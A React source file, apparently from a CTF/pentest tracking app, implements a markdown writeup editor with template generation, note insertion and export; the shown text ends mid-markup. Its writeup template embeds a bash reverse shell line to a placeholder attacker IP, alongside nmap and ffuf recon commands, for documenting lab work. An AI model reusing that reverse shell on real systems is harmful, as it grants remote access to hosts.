import React, { useState, useEffect, useMemo, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { 
  FileText, 
  Download, 
  Copy, 
  Check, 
  RotateCcw, 
  Sparkles, 
  ExternalLink,
  Code,
  Eye,
  BookOpen,
  FolderGit2,
  Printer,
  X,
  Search,
  Plus,
  Upload,
  RefreshCw,
  ShieldAlert
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { Machine } from '../../types';
import { playCyberSound, interpolateCommand, safeCopyToClipboard } from '../../utils/helpers';
import { PentestReportModal } from './PentestReportModal';
import { CvssCalculatorModal } from '../common/CvssCalculatorModal';
import { WriteupImportModal } from './WriteupImportModal';
import { getAllCptsNotes, CptsNoteEntry, searchCptsNotes, getRecommendedNotesForMachine } from '../../utils/obsidianManualUtils';
import { PlatformIcon } from '../common/PlatformBadge';
import { CyberSelect, CyberSelectOption } from '../common/CyberSelect';
import { extractMachineCves } from '../../utils/cveUtils';
import {
  formatCredentialsMarkdownTable,
  formatCvesMarkdownSection,
  syncMachineDataIntoWriteup,
  injectImportedScanIntoWriteup,
} from '../../utils/writeupSyncUtils';
import { detectAndParseScan } from '../../utils/scanParserUtils';
import { useStoredPdfs } from '../../hooks/useStoredPdfs';

export const WriteupStudio: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const { 
    machines, 
    writeupMachineId, 
    setWriteupMachineId, 
    updateMachine, 
    soundEnabled, 
    globalVars, 
    setCvssModalOpen,
    setCvssInsertHandler,
    setPdfModalMachineId,
  } = useCtfStore();

  const { hasPdf, hasStoredPdf } = useStoredPdfs();

  useEffect(() => {
    if (id && machines.some((m) => m.id === id)) {
      setWriteupMachineId(id);
    }
  }, [id, machines, setWriteupMachineId]);

  const activeTargetId = useCtfStore((s) => s.activeTargetId);
  const selectedMachine = useMemo(() => {
    if (writeupMachineId) {
      const found = machines.find((m) => m.id === writeupMachineId);
      if (found) return found;
    }
    if (activeTargetId) {
      const active = machines.find((m) => m.id === activeTargetId);
      if (active) return active;
    }
    // Balanced selection between HTB and THM
    const htb = machines.find((m) => m.platform === 'HTB');
    return htb || machines[0];
  }, [machines, writeupMachineId, activeTargetId]);

  const [copied, setCopied] = useState(false);
  const [reportModalOpen, setReportModalOpen] = useState(false);
  const [importModalOpen, setImportModalOpen] = useState(false);
  const [syncSuccess, setSyncSuccess] = useState(false);
  const [isEditorDragging, setIsEditorDragging] = useState(false);
  const [editorContent, setEditorContent] = useState('');
  const [cptsDrawerOpen, setCptsDrawerOpen] = useState(false);
  const [cptsSearch, setCptsSearch] = useState('');
  const [debouncedSearch, setDebouncedSearch] = useState('');
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);

  // Debounce search query by 150ms to maintain 120 FPS
  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedSearch(cptsSearch);
    }, 150);
    return () => clearTimeout(timer);
  }, [cptsSearch]);

  // Capped at top 20 matches as mandated by Fable Advisor
  const matchingNotes = useMemo(() => {
    if (!debouncedSearch.trim()) {
      return selectedMachine ? getRecommendedNotesForMachine(selectedMachine, 20) : getAllCptsNotes().slice(0, 20);
    }
    return searchCptsNotes(debouncedSearch, 'ALL').slice(0, 20);
  }, [debouncedSearch, selectedMachine]);

  const handleInsertNote = (note: CptsNoteEntry) => {
    if (!selectedMachine) return;
    const targetVars = { ...globalVars, targetIp: selectedMachine.ip || globalVars.targetIp };
    const cmdsFormatted = note.commands && note.commands.length > 0
      ? `\n\`\`\`bash\n# ${note.title}\n${note.commands.map(c => interpolateCommand(c, targetVars)).join('\n')}\n\`\`\`\n`
      : '';

    const snippet = `\n\n---\n\n### 📚 Field Manual: ${note.title}\n> **Category:** ${note.category} | **Difficulty:** ${note.difficulty}\n> ${note.summary || note.subCategory}\n${cmdsFormatted}`;

    const updated = editorContent + snippet;
    setEditorContent(updated);
    updateMachine(selectedMachine.id, { writeupMarkdown: updated });
    if (soundEnabled) playCyberSound('root');
  };

  // 1-Click Sync all machine recon, credentials, notes, and CVEs into editor
  const handleQuickSync = () => {
    if (!selectedMachine) return;
    const updated = syncMachineDataIntoWriteup(editorContent, selectedMachine);
    setEditorContent(updated);
    updateMachine(selectedMachine.id, { writeupMarkdown: updated });
    setSyncSuccess(true);
    if (soundEnabled) playCyberSound('flag');
    setTimeout(() => setSyncSuccess(false), 2000);
  };

  // Drag-and-drop file onto writeup editor
  const handleEditorDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsEditorDragging(false);
    const files = e.dataTransfer.files;
    if (files && files.length > 0 && selectedMachine) {
      const file = files[0];

      // File size guard: 2MB max
      if (file.size > 2 * 1024 * 1024) {
        alert(`File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Writeup Studio accepts text, markdown, and scan files up to 2MB.`);
        if (soundEnabled) playCyberSound('toggle');
        return;
      }

      const reader = new FileReader();
      reader.onload = (event) => {
        const text = event.target?.result as string;
        if (!text) return;

        // Auto-detect if scan or markdown
        const parsed = detectAndParseScan(text);
        if (parsed && parsed.ports.length > 0) {
          const updated = injectImportedScanIntoWriteup(editorContent, parsed, selectedMachine);
          setEditorContent(updated);
          updateMachine(selectedMachine.id, { writeupMarkdown: updated });
          if (soundEnabled) playCyberSound('root');
        } else {
          // Append markdown notes
          const updated = `${editorContent.trimEnd()}\n\n---\n\n${text.trim()}`;
          setEditorContent(updated);
          updateMachine(selectedMachine.id, { writeupMarkdown: updated });
          if (soundEnabled) playCyberSound('root');
        }
      };
      reader.onerror = () => {
        console.error('Failed to read dropped file into writeup studio');
        if (soundEnabled) playCyberSound('toggle');
      };
      reader.readAsText(file);
    }
  };

  // Generate standardized template with YAML frontmatter for Obsidian / GitBook
  const generateTemplate = (m: Machine): string => {
    const today = new Date().toISOString().slice(0, 10);
    const tagsList = m.tags.length > 0 ? m.tags.join(', ') : 'ctf, pentest, writeup';
    const cves = extractMachineCves(m);
    const cvesSection = cves.length > 0 ? `\n${formatCvesMarkdownSection(cves)}\n` : '';
    const credsSection = m.credentials && m.credentials.length > 0
      ? `\n${formatCredentialsMarkdownTable(m.credentials)}\n`
      : '';
    const notesSection = m.quickNotes && m.quickNotes.trim().length > 0
      ? `\n### 📝 Operator Field Notes & Tactical Observations\n${m.quickNotes.trim()}\n`
      : '';

    // Generate real open ports section if available
    let servicesSection = `### Discovered Services:\n- **Port 22/tcp:** Open (OpenSSH)\n- **Port 80/tcp:** Open (HTTP)\n`;
    if (m.openPorts && m.openPorts.length > 0) {
      const sorted = [...m.openPorts].sort((a, b) => a - b);
      servicesSection = `### Discovered Services (${sorted.length} Open Ports Detected):\n` +
        sorted.map(p => `- **Port ${p}/tcp:** Open (Discovered during recon)`).join('\n') + '\n';
    }

    return `---
title: "HTB / CTF Writeup - ${m.name}"
target_ip: "${m.ip}"
platform: "${m.platform}"
os: "${m.os}"
difficulty: "${m.difficulty}"
status: "${m.status}"
user_flag: "${m.userFlag || 'FLAG{...}'}"
root_flag: "${m.rootFlag || 'FLAG{...}'}"
time_spent: "${Math.round(m.timeSpentSeconds / 60)} minutes"
tags: [${tagsList}]
date: "${today}"
author: "ZeroBox Operator"
---

# ${m.name} — Writeup & Penetration Testing Report
**Target IP:** \`${m.ip}\` | **OS:** ${m.os} | **Platform:** ${m.platform} | **Difficulty:** ${m.difficulty}

---

## 1. Executive Summary & Difficulty Breakdown
- **Initial Foothold Vector:** [Brief summary of initial vulnerability, e.g. SQL Injection / LFI / Deserialization]
- **Privilege Escalation Vector:** [Brief summary of root escalation, e.g. SUID binary / Sudo misconfiguration / ADCS]
- **Perceived Rating:** ${m.difficulty} (Official) vs ${m.perceivedDifficulty || m.difficulty} (Perceived)

---

## 2. Reconnaissance & Nmap Scan Results
### TCP All-Ports Scan
\`\`\`bash
# Fast SYN and Service Version Detection
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt ${m.ip}
\`\`\`

${servicesSection}
### Web Directory & Endpoint Fuzzing
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://${m.ip}/FUZZ -ac
\`\`\`

---

## 3. Vulnerability Analysis & Foothold Exploitation
${cvesSection}${notesSection}
### Discovery:
[Detail the attack vector found during enumeration]

### Exploitation Proof-of-Concept:
\`\`\`bash
# Reverse Shell or Exploit Execution
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
\`\`\`

### User Flag Loot:
\`\`\`bash
cat /home/*/user.txt
# Flag: ${m.userFlag || 'FLAG{...}'}
\`\`\`

---

## 4. Privilege Escalation & Proof of Concept
### Internal Enumeration:
- Ran LinPEAS / WinPEAS automated audit.
- Identified misconfigured SUID / Sudo permissions:
\`\`\`bash
sudo -l
\`\`\`

### Root Escalation:
[Explain escalation path step by step]

### Root / System Flag:
\`\`\`bash
cat /root/root.txt
# Flag: ${m.rootFlag || 'FLAG{...}'}
\`\`\`

---

## 5. Post-Exploitation Loot & Lessons Learned
${credsSection}
- **Key Takeaway 1:** Always inspect source comments for credential leaks.
- **Key Takeaway 2:** Validate wildcard expansions in scheduled crontabs.
- **Mitigation:** Patch vulnerable services, restrict sudoers configuration, and apply least privilege principles.
`;
  };

  // Synchronize editor content with selected machine writeup (including external scan imports)
  useEffect(() => {
    if (selectedMachine) {
      if (selectedMachine.writeupMarkdown) {
        if (selectedMachine.writeupMarkdown !== editorContent) {
          setEditorContent(selectedMachine.writeupMarkdown);
        }
      } else {
        const tmpl = generateTemplate(selectedMachine);
        setEditorContent(tmpl);
        updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
      }
    }
  }, [selectedMachine?.id, selectedMachine?.writeupMarkdown]);

  // Debounce store writeup synchronization on keystrokes to prevent 60fps frame drops
  const updateTimerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    return () => {
      if (updateTimerRef.current) {
        clearTimeout(updateTimerRef.current);
      }
    };
  }, []);

  // Register CVSS insertion callback so clicking "Insert Into Writeup" in CVSS Calculator inserts markdown
  useEffect(() => {
    const handleInsertCvss = (markdown: string) => {
      setEditorContent((prev) => {
        const next = prev.trim() ? `${prev}\n\n${markdown}\n` : `${markdown}\n`;
        if (selectedMachine) {
          updateMachine(selectedMachine.id, { writeupMarkdown: next });
        }
        return next;
      });
      if (soundEnabled) playCyberSound('root');
    };

    setCvssInsertHandler(handleInsertCvss);
    return () => setCvssInsertHandler(null);
  }, [setCvssInsertHandler, selectedMachine, updateMachine, soundEnabled]);

  const handleEditorChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value;
    setEditorContent(val);
    if (selectedMachine) {
      if (updateTimerRef.current) {
        clearTimeout(updateTimerRef.current);
      }
      updateTimerRef.current = setTimeout(() => {
        updateMachine(selectedMachine.id, { writeupMarkdown: val });
      }, 350);
    }
  };

  const handleEditorBlur = () => {
    if (selectedMachine && updateTimerRef.current) {
      clearTimeout(updateTimerRef.current);
      updateTimerRef.current = null;
      updateMachine(selectedMachine.id, { writeupMarkdown: editorContent });
    }
  };

  const handleResetToTemplate = () => {
    if (!selectedMachine) return;
    if (confirm(`Reset writeup for ${selectedMachine.name} to standard template?`)) {
      const tmpl = generateTemplate(selectedMachine);
      setEditorContent(tmpl);
      updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
      if (soundEnabled) playCyberSound('root');
    }
  };

  const handleCopyMarkdown = async () => {
    await safeCopyToClipboard(editorContent);
    setCopied(true);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadMarkdown = () => {
    if (!selectedMachine) return;
    const blob = new Blob([editorContent], { type: 'text/markdown;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `${selectedMachine.name.toLowerCase().replace(/[^a-z0-9]/g, '-')}-writeup.md`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    if (soundEnabled) playCyberSound('root');
  };

  // Safe inline markdown parser (bold, inline code, links, CTF flags, italics)
  const parseWriteupInline = (line: string, keyPrefix: string): React.ReactNode[] => {
    if (!line) return [];
    const tokenRegex = /(\[[^\]]+\]\([^)]+\)|\*\*[^*\n]+\*\*|`[^`\n]+`|[a-zA-Z0-9_\-]+{[^}\n]+}|\*[^*\n]+\*)/g;
    const elements: React.ReactNode[] = [];
    let lastIdx = 0;
    let match: RegExpExecArray | null;

    while ((match = tokenRegex.exec(line)) !== null) {
      if (match.index > lastIdx) {
        elements.push(line.substring(lastIdx, match.index));
      }
      const token = match[1];
      const tKey = `${keyPrefix}-${match.index}`;

      if (token.startsWith('[') && token.includes('](')) {
        const linkMatch = token.match(/^\[([^\]]+)\]\(([^)]+)\)$/);
        if (linkMatch) {
          const [, label, url] = linkMatch;
          const isSafeUrl = !url.toLowerCase().startsWith('javascript:') && !url.toLowerCase().startsWith('data:');
          elements.push(
            <a
              key={tKey}
              href={isSafeUrl ? url : '#'}
              target="_blank"
              rel="noopener noreferrer"
              className="text-cyber-cyan underline hover:text-white font-semibold inline-flex items-center gap-0.5"
            >
              <span>{label}</span>
              <ExternalLink className="w-2.5 h-2.5 inline opacity-70" />
            </a>
          );
        } else {
          elements.push(token);
        }
      } else if (token.startsWith('**') && token.endsWith('**')) {
        elements.push(
          <strong key={tKey} className="font-bold text-white">
            {token.slice(2, -2)}
          </strong>
        );
      } else if (token.startsWith('`') && token.endsWith('`')) {
        elements.push(
          <code key={tKey} className="px-1.5 py-0.5 rounded bg-black/60 text-cyber-cyan border border-cyber-border/70 font-mono text-[11px]">
            {token.slice(1, -1)}
          </code>
        );
      } else if (/[a-zA-Z0-9_\-]+{[^}\n]+}/.test(token)) {
        elements.push(
          <span key={tKey} className="px-1.5 py-0.5 rounded bg-cyber-emerald/20 text-cyber-emerald border border-cyber-emerald/40 font-mono text-[11px] font-bold">
            {token}
          </span>
        );
      } else if (token.startsWith('*') && token.endsWith('*')) {
        elements.push(
          <em key={tKey} className="italic text-slate-300">
            {token.slice(1, -1)}
          </em>
        );
      } else {
        elements.push(token);
      }
      lastIdx = tokenRegex.lastIndex;
    }

    if (lastIdx < line.length) {
      elements.push(line.substring(lastIdx));
    }

    return elements;
  };

  // Simple, robust markdown preview renderer supporting codeblocks, frontmatter, and headers
  const renderMarkdownPreview = (text: string) => {
    const lines = text.split('\n');
    let inFrontmatter = false;
    let frontmatterLines: string[] = [];
    let inCodeBlock = false;
    let codeBlockLang = '';
    let codeBlockLines: string[] = [];

    const elements: React.ReactNode[] = [];

    lines.forEach((line, idx) => {
      // Frontmatter detection
      if (idx === 0 && line.trim() === '---') {
        inFrontmatter = true;
        return;
      }
      if (inFrontmatter) {
        if (line.trim() === '---') {
          inFrontmatter = false;
          elements.push(
            <div key={`fm-${idx}`} className="mb-4 p-3 rounded-lg bg-cyber-bg border border-cyber-cyan/30 text-[11px] font-mono text-cyber-cyan/90 space-y-0.5">
              <div className="text-[10px] uppercase font-bold text-cyber-muted mb-1 flex items-center gap-1">
                <FolderGit2 className="w-3 h-3 text-cyber-cyan" /> OBSIDIAN / GITBOOK YAML FRONTMATTER
              </div>
              {frontmatterLines.map((fl, fIdx) => (
                <div key={fIdx}>{fl}</div>
              ))}
            </div>
          );
          return;
        }
        frontmatterLines.push(line);
        return;
      }

      // Codeblock detection
      if (line.startsWith('```')) {
        if (!inCodeBlock) {
          inCodeBlock = true;
          codeBlockLang = line.replace('```', '').trim();
          codeBlockLines = [];
        } else {
          inCodeBlock = false;
          elements.push(
            <div key={`cb-${idx}`} className="my-3 rounded-lg overflow-hidden border border-cyber-border bg-cyber-code">
              {codeBlockLang && (
                <div className="bg-cyber-bg/80 px-3 py-1 text-[10px] text-cyber-muted font-mono uppercase border-b border-cyber-border flex items-center justify-between">
                  <span>{codeBlockLang}</span>
                  <Code className="w-3 h-3" />
                </div>
              )}
              <pre className="p-3 text-xs text-cyber-emerald font-mono overflow-x-auto whitespace-pre-wrap">
                {codeBlockLines.join('\n')}
              </pre>
            </div>
          );
        }
        return;
      }

      if (inCodeBlock) {
        codeBlockLines.push(line);
        return;
      }

      // Headings
      if (line.startsWith('# ')) {
        elements.push(
          <h1 key={idx} className="text-xl font-bold text-white mt-4 mb-2 pb-1 border-b border-cyber-border">
            {parseWriteupInline(line.replace('# ', ''), `h1-${idx}`)}
          </h1>
        );
      } else if (line.startsWith('## ')) {
        elements.push(
          <h2 key={idx} className="text-base font-bold text-cyber-cyan mt-4 mb-1.5 flex items-center gap-2">
            {parseWriteupInline(line.replace('## ', ''), `h2-${idx}`)}
          </h2>
        );
      } else if (line.startsWith('### ')) {
        elements.push(
          <h3 key={idx} className="text-sm font-semibold text-cyber-text mt-3 mb-1">
            {parseWriteupInline(line.replace('### ', ''), `h3-${idx}`)}
          </h3>
        );
      } else if (line.startsWith('---')) {
        elements.push(<hr key={idx} className="my-3 border-cyber-border" />);
      } else if (line.startsWith('- ')) {
        elements.push(
          <li key={idx} className="ml-4 text-xs text-cyber-text list-disc my-0.5">
            {parseWriteupInline(line.replace('- ', ''), `li-${idx}`)}
          </li>
        );
      } else if (line.trim() === '') {
        elements.push(<div key={idx} className="h-2" />);
      } else {
        elements.push(
          <p key={idx} className="text-xs text-cyber-text leading-relaxed font-sans">
            {parseWriteupInline(line, `p-${idx}`)}
          </p>
        );
      }
    });

    return elements;
  };

  return (
    <div className="space-y-4 w-full font-mono">
      {/* Studio Header Bar */}
      <div className="p-4 rounded-xl border border-cyber-border bg-cyber-card/90 shadow-md flex flex-wrap items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-cyber-bg border border-cyber-cyan/40 flex items-center justify-center">
            <FileText className="w-5 h-5 text-cyber-cyan" />
          </div>
          <div>
            <h1 className="text-base font-bold text-white flex items-center gap-2">
              EMBEDDED WRITEUP STUDIO
              <span className="text-[10px] font-semibold px-2 py-0.5 rounded bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/30">
                OBSIDIAN & GITBOOK READY
              </span>
            </h1>
            <p className="text-xs text-cyber-muted mt-0.5">
              Dual-pane live editor with automated pentest template generation, frontmatter, and single-click .md export.
            </p>
          </div>
        </div>

        {/* Machine Selector & Export Actions */}
        <div className="flex flex-wrap items-center gap-2.5">
          {/* Machine Dropdown */}
          <div className="flex items-center gap-1.5 bg-cyber-bg px-2.5 py-1 rounded-lg border border-cyber-border">
            <span className="text-[10px] uppercase font-bold text-cyber-muted">Target Box:</span>
            <CyberSelect
              value={selectedMachine?.id || ''}
              onChange={setWriteupMachineId}
              options={machines.map((m) => ({
                value: m.id,
                label: `${m.name} (${m.platform})`,
                icon: <PlatformIcon platform={m.platform} className="w-3.5 h-3.5" />,
                description: `${m.ip} · ${m.difficulty}`,
              }))}
              searchable
              searchPlaceholder="Search box by name, IP..."
              variant="transparent"
              size="xs"
              triggerClassName="py-0 px-1 border-none bg-transparent hover:bg-transparent max-w-[210px]"
              soundEnabled={soundEnabled}
            />
          </div>

          <button
            onClick={() => setImportModalOpen(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyan-50 dark:bg-cyber-card border border-cyan-300 dark:border-cyber-cyan/40 hover:border-cyan-500 dark:hover:border-cyber-cyan text-cyan-900 dark:text-cyber-cyan hover:bg-cyan-100 dark:hover:bg-cyber-cyan/10 text-xs font-bold active:scale-[0.98] transition-all shadow-sm"
            title="Import scans (Nmap, XML, Rustscan), markdown files, or sync machine data"
          >
            <Upload className="w-3.5 h-3.5" />
            <span>Import Scan Intel</span>
          </button>

          <button
            onClick={handleQuickSync}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs font-bold transition-all shadow-sm ${
              syncSuccess
                ? 'bg-emerald-100 dark:bg-cyber-emerald/20 border-emerald-400 dark:border-cyber-emerald text-emerald-900 dark:text-cyber-emerald'
                : 'bg-slate-100 dark:bg-cyber-card border-slate-300 dark:border-cyber-border hover:border-purple-500 text-purple-900 dark:text-cyber-purple hover:bg-purple-50 dark:hover:bg-cyber-purple/10'
            }`}
            title="1-Click synchronize open ports, credentials, field notes, and CVEs into active writeup"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${syncSuccess ? 'animate-spin' : ''}`} />
            <span>{syncSuccess ? 'Synced!' : 'Sync Machine Data'}</span>
          </button>

          <button
            onClick={handleResetToTemplate}
            className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-slate-100 dark:bg-cyber-bg border border-slate-300 dark:border-cyber-border text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white text-xs transition-colors"
            title="Reset to fresh pentest template"
          >
            <RotateCcw className="w-3.5 h-3.5" />
            <span className="hidden sm:inline">Reset Template</span>
          </button>

          <button
            onClick={handleCopyMarkdown}
            className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-slate-100 dark:bg-cyber-card border border-slate-300 dark:border-cyber-border hover:border-cyan-500 text-slate-900 dark:text-white text-xs font-semibold transition-all"
          >
            {copied ? (
              <>
                <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-cyber-emerald" />
                <span className="text-emerald-700 dark:text-cyber-emerald font-bold">Copied!</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" />
                <span>Copy Raw</span>
              </>
            )}
          </button>

          <button
            onClick={() => setCptsDrawerOpen(prev => !prev)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs font-bold transition-all shadow-sm ${
              cptsDrawerOpen
                ? 'bg-purple-600 dark:bg-purple-500 text-white dark:text-black border-purple-500 dark:border-purple-400 shadow-purple-500/30'
                : 'bg-purple-100 dark:bg-purple-950/30 border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 hover:bg-purple-200 dark:hover:bg-purple-900/40 hover:text-purple-950 dark:hover:text-white'
            }`}
            title="Toggle Field Manual Quick Reference Drawer"
          >
            <BookOpen className="w-3.5 h-3.5" />
            <span>Field Manual ({matchingNotes.length})</span>
          </button>

          <button
            onClick={() => {
              setCvssModalOpen(true);
              if (soundEnabled) playCyberSound('click');
            }}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-purple-100 dark:bg-purple-950/30 border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 hover:bg-purple-200 dark:hover:bg-purple-900/40 hover:text-purple-950 dark:hover:text-white text-xs font-bold transition-all shadow-sm"
            title="Calculate and Insert CVSS 3.1 Base Score & Vector String"
          >
            <ShieldAlert className="w-3.5 h-3.5 text-purple-700 dark:text-purple-400" />
            <span>+ CVSS 3.1</span>
          </button>

          <button
            onClick={() => setReportModalOpen(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyan-50 dark:bg-cyber-card border border-cyan-300 dark:border-cyber-cyan/40 hover:border-cyan-500 dark:hover:border-cyber-cyan text-cyan-900 dark:text-cyber-cyan hover:bg-cyan-100 dark:hover:bg-cyber-cyan/10 text-xs font-bold transition-all shadow-sm"
            title="Generate print-ready Executive Penetration Testing Report"
          >
            <Printer className="w-3.5 h-3.5" />
            <span>Executive Report</span>
          </button>

          {selectedMachine && (
            <button
              onClick={() => {
                setPdfModalMachineId(selectedMachine.id);
                if (soundEnabled) playCyberSound('click');
              }}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-emerald-100 dark:bg-cyber-emerald/15 border border-emerald-300 dark:border-cyber-emerald/40 text-emerald-900 dark:text-cyber-emerald hover:bg-emerald-500 hover:text-white dark:hover:bg-cyber-emerald dark:hover:text-black text-xs font-bold transition-all shadow-sm"
              title={hasStoredPdf(selectedMachine.id) ? 'View Stored Writeup PDF' : (selectedMachine.officialPdf ? 'View Official HTB PDF' : 'Attach / View PDF Writeup')}
            >
              <FileText className="w-3.5 h-3.5" />
              <span>{hasStoredPdf(selectedMachine.id) ? 'Writeup PDF' : (selectedMachine.officialPdf ? 'HTB PDF' : 'Attach PDF')}</span>
            </button>
          )}

          {Boolean(selectedMachine?.officialWalkthrough) && (
            <button
              onClick={() => {
                if (!selectedMachine.officialWalkthrough) return;
                const injection = `\n\n---\n\n## 🛡️ Official Hack The Box Walkthrough & Intelligence\n${selectedMachine.officialWalkthrough}\n`;
                const updated = editorContent + injection;
                setEditorContent(updated);
                updateMachine(selectedMachine.id, { writeupMarkdown: updated });
                if (soundEnabled) playCyberSound('engage');
              }}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-emerald-100 dark:bg-cyber-emerald/15 border border-emerald-300 dark:border-cyber-emerald/40 hover:border-emerald-500 text-emerald-900 dark:text-cyber-emerald hover:bg-emerald-600 hover:text-white dark:hover:bg-cyber-emerald dark:hover:text-black text-xs font-bold transition-all shadow-sm"
              title="Append official Hack The Box Walkthrough & Intelligence to this writeup"
            >
              <Sparkles className="w-3.5 h-3.5" />
              <span>+ Official HTB Intel</span>
            </button>
          )}

          <button
            onClick={handleDownloadMarkdown}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald text-black font-bold text-xs hover:bg-cyber-emerald/90 transition-all shadow-glow-emerald"
          >
            <Download className="w-3.5 h-3.5" />
            <span>Export .md</span>
          </button>
        </div>
      </div>

      {/* Field Manual Quick Reference Drawer */}
      {cptsDrawerOpen && (
        <div className="p-4 rounded-xl border border-purple-300 dark:border-purple-500/40 bg-white dark:bg-cyber-card/95 shadow-2xl space-y-3 font-mono">
          <div className="flex items-center justify-between border-b border-slate-200 dark:border-cyber-border pb-2.5">
            <div className="flex items-center gap-2">
              <BookOpen className="w-4 h-4 text-purple-600 dark:text-purple-400" />
              <span className="font-bold text-slate-900 dark:text-white text-xs tracking-wider">
                TACTICAL INTEL // QUICK REFERENCE & INSERT
              </span>
              <span className="text-[10px] px-2 py-0.5 rounded bg-purple-100 dark:bg-purple-500/20 text-purple-900 dark:text-purple-300 border border-purple-200 dark:border-transparent font-mono">
                {matchingNotes.length} MATCHES (MAX 20)
              </span>
            </div>

            <button
              type="button"
              onClick={() => setCptsDrawerOpen(false)}
              className="p-1 rounded text-slate-400 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {/* Quick Search Bar */}
          <div className="relative">
            <Search className="w-3.5 h-3.5 text-slate-400 dark:text-cyber-muted absolute left-3 top-2.5" />
            <input
              type="text"
              id="writeup-notes-search"
              name="writeup-notes-search"
              aria-label="Search field manual notes and commands"
              value={cptsSearch}
              onChange={(e) => setCptsSearch(e.target.value)}
              placeholder="Search field manual notes & commands (e.g. kerberoast, suid, lfi, bloodhound)..."
              className="w-full bg-slate-50 dark:bg-cyber-bg border border-slate-200 dark:border-cyber-border rounded-lg pl-8 pr-3 py-1.5 text-xs text-slate-900 dark:text-white placeholder-slate-400 dark:placeholder-cyber-muted focus:outline-none focus:border-purple-500"
            />
          </div>

          {/* Matching Notes Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-72 overflow-y-auto pr-1">
            {matchingNotes.length === 0 ? (
              <div className="col-span-full p-4 text-center text-xs text-slate-500 dark:text-cyber-muted">
                No matching field manual notes found.
              </div>
            ) : (
              matchingNotes.map((note) => (
                <div
                  key={note.id}
                  className="p-3 rounded-lg bg-slate-50 dark:bg-cyber-bg border border-slate-200 dark:border-cyber-border hover:border-purple-500/50 transition-all space-y-2 flex flex-col justify-between"
                >
                  <div className="space-y-1">
                    <div className="flex items-center justify-between gap-1">
                      <span className="font-bold text-slate-900 dark:text-white text-xs truncate" title={note.title}>
                        {note.title}
                      </span>
                      <span className="text-[9px] px-1.5 py-0.2 rounded bg-purple-100 dark:bg-purple-500/15 text-purple-900 dark:text-purple-300 border border-purple-200 dark:border-purple-500/30 flex-shrink-0 font-mono">
                        {note.difficulty}
                      </span>
                    </div>
                    <div className="text-[10px] text-slate-500 dark:text-cyber-muted line-clamp-2">
                      {note.summary || note.subCategory}
                    </div>
                  </div>

                  {note.commands && note.commands.length > 0 && (
                    <div className="p-1.5 rounded bg-slate-900 dark:bg-black/50 border border-slate-800 dark:border-cyber-border/70 font-mono text-[10px] text-cyan-300 dark:text-cyber-cyan truncate">
                      {interpolateCommand(note.commands[0], { ...globalVars, targetIp: selectedMachine?.ip || globalVars.targetIp })}
                    </div>
                  )}

                  <div className="flex items-center justify-between gap-2 pt-1 border-t border-slate-200 dark:border-cyber-border/50">
                    <span className="text-[9px] text-slate-500 dark:text-cyber-muted font-mono truncate">
                      {note.category}
                    </span>
                    <button
                      type="button"
                      onClick={() => handleInsertNote(note)}
                      className="flex items-center gap-1 px-2.5 py-1 rounded bg-purple-100 dark:bg-purple-500/20 hover:bg-purple-600 hover:text-white dark:hover:bg-purple-500 dark:hover:text-black border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 text-[10px] font-bold transition-all"
                      title="Insert this note and commands into active writeup"
                    >
                      <Plus className="w-3 h-3" />
                      <span>Insert</span>
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {/* Dual-Pane Editor Workspace */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 items-stretch min-h-[calc(100vh-250px)]">
        
        {/* Left Pane: Raw Markdown Editor */}
        <div className="flex flex-col rounded-xl border border-slate-200 dark:border-cyber-border bg-white dark:bg-cyber-card overflow-hidden shadow-lg relative">
          <div className="flex items-center justify-between border-b border-slate-200 dark:border-cyber-border px-4 py-2.5 bg-slate-50 dark:bg-cyber-bg/70 text-xs">
            <span className="font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <Code className="w-4 h-4 text-cyan-600 dark:text-cyber-cyan" /> RAW MARKDOWN (YAML & BODY)
            </span>
            <span className="text-[10px] text-slate-500 dark:text-cyber-muted">
